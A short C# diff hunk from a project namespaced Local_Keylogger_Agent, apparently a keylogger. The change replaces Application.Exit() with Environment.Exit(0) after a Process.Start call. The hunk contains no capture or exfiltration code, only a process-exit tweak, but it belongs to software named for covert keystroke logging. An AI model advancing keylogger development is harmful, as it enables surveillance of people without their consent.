@@ -59,7 +59,7 @@ namespace Local_Keylogger_Agent
 
 
                 Process.Start(psi2);
-                Application.Exit();
+                Environment.Exit(0); // Exit the current process after starting the new one
             }
             catch (Exception)
             {
